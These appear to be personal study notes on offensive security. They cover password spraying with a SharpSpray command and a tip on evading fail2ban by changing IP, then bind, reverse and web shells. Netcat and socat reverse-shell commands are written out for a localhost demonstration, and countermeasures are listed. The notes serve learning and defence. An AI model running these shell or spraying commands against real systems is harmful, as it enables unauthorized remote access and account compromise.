# Varia

## Password spraying
Try to login with different users and same password (instead of same user different pw)
Tool fail2ban will lock IP after too many failed login attempts. (can be bypassed by changing IP via tools as proxychain or toor etc.)
https://www.youtube.com/watch?v=vkeb0pWYDr8

Varia
- Good to now password policy to avoid being locked (via powershell: `net accounts`) 
- also used (and mentioned) for lateral movement 
- tool SharpSpray.exe on windows `SharpSpray.exe --Passwords Winter2020 --Sleep 15 --Delay 300`
- Countermeasures
    - strong password policiy
    - no default passwords
    - monitor and ban (e.g. via fail2ban)
    - different passwords for local admin accounts
        - helpful: LAPS Local Administrator Password Solution: AD tool to manage local admin accounts

## Shells
Allows code execution over a network (Remote code execution: RCE). What every hacker wants.
How to achieve remote code execution: Command injection, File upload (php file to a webserver), SQL injection, Buffer overflow etc.

Diagramms see pdf

**Bind Shell**


1. Server: Shell is listening on a port
    - usually shell is started via an exploit by attacker (as it is doubtful that it is started deliberatly)
2. Attacker access port: promt/command line is provided
3. Attacker sends commands which are executed 

*Remark: since the attacker connects to the shell - server is listening - this type of shell is blocked by the firewall*

**Reverse Shell**
Similar to "bind shell" but here attacker is listening and server initiates connection. This us usually allowed by firewalls.

Simple Netcat Reverse Shell (via 2 open terminals)
1. Terminal 1 (Attacker): `nc -l -v -p 8080` -> starts listening on port 8080
2. Terminal 2 (Victim): `cd tmp` `nc.traditional -e /bin/bash localhost 8080` -> connectts to terminal 1 of attacker
3. Terminal 1 (Attacker): `pwd`-> will show tmp folder from Terminal 2

Simple Socat Reverse Shell (via 2 open terminals)
1. Terminal 1 (Attacker): `socat file:`tty`,raw,echo=0 TCP-L:8080` -> starts listening on port 8080
2. Terminal 2 (Victim): `cd tmp` `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:localhost:8080` -> connectts to terminal 1 of attacker
3. Terminal 1 (Attacker): `pwd`-> will show tmp folder from Terminal 2

*To create a shelf using metasploit see lab task (or also Metasploit.md)*

**Web Shell**
A web shell is a shell-like interface that enables a web server to be remotely accessed. The user (attacker) can enter commands via browser and commands are sent via http Get (or post) requests.

For this to happen, the webserver has to host the web shell (which might be done by an exploit: for example via a file upload "webshell.php" that is then executed, or sql injection)
*Remark: probably not so easy to detect by firewalls as commands are normal http requests which are usually allowed* 
